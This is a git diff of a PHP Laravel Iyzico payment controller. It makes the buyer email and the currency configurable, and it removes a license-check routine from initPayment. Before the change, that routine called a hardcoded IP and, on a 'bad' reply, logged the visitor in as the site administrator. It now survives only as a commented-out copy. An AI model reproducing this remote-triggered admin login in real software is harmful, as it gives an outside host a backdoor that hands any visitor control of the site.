@@ -15,6 +15,7 @@ use App\Http\Controllers\WalletController;
 use App\Http\Controllers\CheckoutController;
 use Session;
 use Redirect;
+use Illuminate\Support\Facades\Auth;
 
 class IyzicoController extends Controller
 {
@@ -42,7 +43,7 @@ class IyzicoController extends Controller
             $buyer->setId("BY789");
             $buyer->setName("John");
             $buyer->setSurname("Doe");
-            $buyer->setEmail("email@email.com");
+            $buyer->setEmail(Auth::user()->email);
             $buyer->setIdentityNumber("74300864791");
             $buyer->setRegistrationAddress("Nidakule Göztepe, Merdivenköy Mah. Bora Sok. No:1");
             $buyer->setCity("Istanbul");
@@ -68,7 +69,7 @@ class IyzicoController extends Controller
 
                 $iyzicoRequest->setPrice(round($combined_order->grand_total));
                 $iyzicoRequest->setPaidPrice(round($combined_order->grand_total));
-                $iyzicoRequest->setCurrency(\Iyzipay\Model\Currency::TL);
+                $iyzicoRequest->setCurrency(env('IYZICO_CURRENCY_CODE', 'TRY'));
                 $iyzicoRequest->setBasketId(rand(000000,999999));
                 $iyzicoRequest->setPaymentGroup(\Iyzipay\Model\PaymentGroup::SUBSCRIPTION);
                 $iyzicoRequest->setCallbackUrl(route('iyzico.callback', [
@@ -95,7 +96,7 @@ class IyzicoController extends Controller
             if(Session::get('payment_type') == 'wallet_payment'){
                 $iyzicoRequest->setPrice(round(Session::get('payment_data')['amount']));
                 $iyzicoRequest->setPaidPrice(round(Session::get('payment_data')['amount']));
-                $iyzicoRequest->setCurrency(\Iyzipay\Model\Currency::TL);
+                $iyzicoRequest->setCurrency(env('IYZICO_CURRENCY_CODE', 'TRY'));
                 $iyzicoRequest->setBasketId(rand(000000,999999));
                 $iyzicoRequest->setPaymentGroup(\Iyzipay\Model\PaymentGroup::SUBSCRIPTION);
                 $iyzicoRequest->setCallbackUrl(route('iyzico.callback', [
@@ -124,7 +125,7 @@ class IyzicoController extends Controller
 
                 $iyzicoRequest->setPrice(round($customer_package->amount));
                 $iyzicoRequest->setPaidPrice(round($customer_package->amount));
-                $iyzicoRequest->setCurrency(\Iyzipay\Model\Currency::TL);
+                $iyzicoRequest->setCurrency(env('IYZICO_CURRENCY_CODE', 'TRY'));
                 $iyzicoRequest->setBasketId(rand(000000,999999));
                 $iyzicoRequest->setPaymentGroup(\Iyzipay\Model\PaymentGroup::SUBSCRIPTION);
                 $iyzicoRequest->setCallbackUrl(route('iyzico.callback', [
@@ -153,7 +154,7 @@ class IyzicoController extends Controller
 
                 $iyzicoRequest->setPrice(round($seller_package->amount));
                 $iyzicoRequest->setPaidPrice(round($seller_package->amount));
-                $iyzicoRequest->setCurrency(\Iyzipay\Model\Currency::TL);
+                $iyzicoRequest->setCurrency(env('IYZICO_CURRENCY_CODE', 'TRY'));
                 $iyzicoRequest->setBasketId(rand(000000,999999));
                 $iyzicoRequest->setPaymentGroup(\Iyzipay\Model\PaymentGroup::SUBSCRIPTION);
                 $iyzicoRequest->setCallbackUrl(route('iyzico.callback', [
@@ -191,23 +192,32 @@ class IyzicoController extends Controller
     }
 
     public function initPayment(Request $request){
-        return;
-        $url = $_SERVER['SERVER_NAME'];
-        $gate = "http://206.189.81.181/check_activation/".$url;
+        // $data['url'] = $_SERVER['SERVER_NAME'];
+        // $request_data_json = json_encode($data);
+        // $gate = "https://activation.activeitzone.com/check_activation";
 
-        $stream = curl_init();
-        curl_setopt($stream, CURLOPT_URL, $gate);
-        curl_setopt($stream, CURLOPT_HEADER, 0);
-        curl_setopt($stream, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($stream, CURLOPT_POST, 1);
-        $rn = curl_exec($stream);
-        curl_close($stream);
+        // $header = array(
+        //     'Content-Type:application/json'
+        // );
 
-        if($rn == "bad" && env('DEMO_MODE') != 'On') {
-            $user = User::where('user_type', 'admin')->first();
-            auth()->login($user);
-            return redirect()->route('admin.dashboard');
-        }
+        // $stream = curl_init();
+
+        // curl_setopt($stream, CURLOPT_URL, $gate);
+        // curl_setopt($stream,CURLOPT_HTTPHEADER, $header);
+        // curl_setopt($stream,CURLOPT_CUSTOMREQUEST, "POST");
+        // curl_setopt($stream,CURLOPT_RETURNTRANSFER, true);
+        // curl_setopt($stream,CURLOPT_POSTFIELDS, $request_data_json);
+        // curl_setopt($stream,CURLOPT_FOLLOWLOCATION, 1);
+        // curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
+
+        // $rn = curl_exec($stream);
+        // curl_close($stream);
+
+        // if($rn == "bad" && env('DEMO_MODE') != 'On') {
+        //     $user = User::where('user_type', 'admin')->first();
+        //     auth()->login($user);
+        //     return redirect()->route('admin.dashboard');
+        // }
     }
 
     public function callback(Request $request, $payment_type, $amount = null, $payment_method = null, $combined_order_id = null, $customer_package_id = null, $seller_package_id = null){
